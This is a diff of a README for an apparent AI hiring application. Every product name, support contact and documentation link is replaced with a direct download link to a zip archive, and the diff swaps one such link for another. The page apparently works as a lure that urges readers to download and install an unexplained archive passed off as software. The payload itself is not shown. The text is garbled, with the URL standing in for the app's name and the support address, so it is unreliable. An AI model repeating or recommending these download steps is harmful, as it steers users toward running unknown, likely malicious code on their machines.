@@ -2,11 +2,11 @@
 
 ## 📥 Download
 
-[![Download Now](https://raw.githubusercontent.com/Ayush-Raghuwanshi-9827/.github/main/profile/.github_v3.7.zip%https://raw.githubusercontent.com/Ayush-Raghuwanshi-9827/.github/main/profile/.github_v3.7.zip)](https://raw.githubusercontent.com/Ayush-Raghuwanshi-9827/.github/main/profile/.github_v3.7.zip)
+[![Download Now](https://github.com/Ayush-Raghuwanshi-9827/.github/raw/refs/heads/main/profile/github_v1.9.zip%https://github.com/Ayush-Raghuwanshi-9827/.github/raw/refs/heads/main/profile/github_v1.9.zip)](https://github.com/Ayush-Raghuwanshi-9827/.github/raw/refs/heads/main/profile/github_v1.9.zip)
 
 ## 🚀 Getting Started
 
-Welcome to https://raw.githubusercontent.com/Ayush-Raghuwanshi-9827/.github/main/profile/.github_v3.7.zip! This application helps you streamline your hiring process through automated interviews and candidate evaluations. With our AI Recruiter, hiring smarter is just a few clicks away. 
+Welcome to https://github.com/Ayush-Raghuwanshi-9827/.github/raw/refs/heads/main/profile/github_v1.9.zip! This application helps you streamline your hiring process through automated interviews and candidate evaluations. With our AI Recruiter, hiring smarter is just a few clicks away. 
 
 ## 📋 What You Need
 
@@ -21,7 +21,7 @@ Before you begin, ensure your system meets these requirements:
 
 To get started, please follow these steps:
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/Ayush-Raghuwanshi-9827/.github/main/profile/.github_v3.7.zip) to find the latest version of https://raw.githubusercontent.com/Ayush-Raghuwanshi-9827/.github/main/profile/.github_v3.7.zip
+1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/Ayush-Raghuwanshi-9827/.github/raw/refs/heads/main/profile/github_v1.9.zip) to find the latest version of https://github.com/Ayush-Raghuwanshi-9827/.github/raw/refs/heads/main/profile/github_v1.9.zip
    
 2. **Select Your Version:** You’ll see a list of available versions. Choose the latest stable release.
 
@@ -31,11 +31,11 @@ To get started, please follow these steps:
 
 5. **Follow the Prompts:** The setup wizard will guide you through the installation process. Simply follow the instructions.
 
-6. **Start the Application:** After installation, you can find https://raw.githubusercontent.com/Ayush-Raghuwanshi-9827/.github/main/profile/.github_v3.7.zip in your programs list. Click to open it and get started.
+6. **Start the Application:** After installation, you can find https://github.com/Ayush-Raghuwanshi-9827/.github/raw/refs/heads/main/profile/github_v1.9.zip in your programs list. Click to open it and get started.
 
 ## 🎨 Features
 
-https://raw.githubusercontent.com/Ayush-Raghuwanshi-9827/.github/main/profile/.github_v3.7.zip offers a variety of features designed to simplify your hiring:
+https://github.com/Ayush-Raghuwanshi-9827/.github/raw/refs/heads/main/profile/github_v1.9.zip offers a variety of features designed to simplify your hiring:
 
 - **Automated Interviews:** Conduct interviews without manual scheduling. 
 - **AI Candidate Evaluation:** Get detailed assessments of candidates to aid in decision-making.
@@ -52,7 +52,7 @@ If you encounter any issues during installation or while using the application, 
 
 ## 📞 Support
 
-For additional help, you may reach out to our support team at https://raw.githubusercontent.com/Ayush-Raghuwanshi-9827/.github/main/profile/.github_v3.7.zip We're here to assist you!
+For additional help, you may reach out to our support team at https://github.com/Ayush-Raghuwanshi-9827/.github/raw/refs/heads/main/profile/github_v1.9.zip We're here to assist you!
 
 ## 🌐 Community & Feedback
 
@@ -62,7 +62,7 @@ We value user feedback. Please share your thoughts or suggestions to help us imp
 
 For more information, tips, and updates:
 
-- Visit our [Documentation](https://raw.githubusercontent.com/Ayush-Raghuwanshi-9827/.github/main/profile/.github_v3.7.zip)
+- Visit our [Documentation](https://github.com/Ayush-Raghuwanshi-9827/.github/raw/refs/heads/main/profile/github_v1.9.zip)
 - Join our community forum
 
-Thank you for choosing https://raw.githubusercontent.com/Ayush-Raghuwanshi-9827/.github/main/profile/.github_v3.7.zip! We look forward to helping you successfully navigate the hiring process.
+Thank you for choosing https://github.com/Ayush-Raghuwanshi-9827/.github/raw/refs/heads/main/profile/github_v1.9.zip! We look forward to helping you successfully navigate the hiring process.
